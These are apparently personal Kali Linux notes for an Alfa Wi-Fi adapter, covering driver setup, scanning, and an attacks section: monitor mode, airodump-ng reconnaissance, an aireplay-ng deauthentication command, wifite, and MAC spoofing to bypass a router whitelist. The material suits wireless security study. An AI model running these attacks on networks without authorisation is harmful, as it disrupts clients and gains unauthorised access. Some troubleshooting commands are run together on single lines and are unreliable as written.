# WIFI Alfa AWUS036ACH
#Kali #Linux 

## Install driver
1. Connect the Wireless device to the Kali linux host.
2. Update package lists
```bash
sudo apt update
```
3. Install driver
```bash
sudo apt install realtek-rtl88xxau-dkms
```
4. Reboot the host


## Troubleshooting Adapter
from #ChatGPT
### Step-by-Step Fix: Install Working RTL8812AU Driver

#### 1. **Remove existing (possibly broken) DKMS driver**

```bash 
sudo apt remove realtek-rtl88xxau-dkms sudo dkms remove rtl88xxau/5.6.4.2_35491.20191025 --all
```

The version may vary — `dkms status` can show you the exact one to remove.

---

#### 2. **Install required build tools**

```bash
sudo apt update sudo apt install -y dkms git build-essential libelf-dev linux-headers-$(uname -r)
```

---

#### 3. **Clone and install the aircrack-ng driver**

```bash
git clone https://github.com/aircrack-ng/rtl8812au.git cd rtl8812au sudo make dkms_install
```

Wait for the build and install to finish (it can take a few minutes).

---

#### 4. **Load the driver manually**

```bash
sudo modprobe 88XXau
```

Check if an interface appears:

```bash
iwconfig
```


## Scan

```bash
iwlist wlan0 scan
```

---

```bash
nmcli dev wifi
```

---

```bash
sudo airodump-ng wlan0
```
By default it will scan only in 2.4Ghz

```bash
airodump-ng wlan0 --manufacturer
```
Gives you a bit more information

```bash
airodump-ng wlan0 --manufacturer --band abg
```
Scan in different bands

## Connecting to an AP via CLI

```bash
nmcli dev wifi connect <SSID> password <PSK>
```

---
Disconnect
```bash
nmcli device disconnect wlan0
```

## Attacks

### Set the wireless adapter in Monitor Mode
```bash
sudo airmon-ng check kill
```

```bash
sudo airmon-ng start wlan0
```

### reconnaissance

```bash
sudo airodump-ng <iw-name> #The name in the output of the airmon-ng command
```

```bash
sudo airodump-ng --bssid <bssid> --channel <CH-number> wlan0
```

### De-auth attack
```bash
sudo aireplay-ng -0 30 -a <client-mac-address> wlan0
```

### Wifite
```bash
sudo wifite
```

### Bypass router mac-address whitelist
1. Run the following command:
```bash
sudo airodump-ng --bssid <bssid> --band bg wlan0mon
```

2. Wait for a client to connect. When a client connects, its mac address appears. Grab the client's mac address. You will manually change your adapter's mac address with this mac address as follows:
```bash
sudo airmon-ng stop wlanmon

sudo systemctl start wpa_supplicant

sudo systemctl stop NetworkManager

sudo ip link set dev wlan0 down

sudo ip link set dev wlan0 address <whitelisted-mac-address>

sudo ip link set dev wlan0 up

sudo systemctl start NetworkManager
```


## Set wireless adapter back in managed mode
```bash
sudo airmon-ng stop wlan0
```

```bash
sudo systemctl start wpa_supplicant
```

```bash
sudo systemctl start NetworkManager
```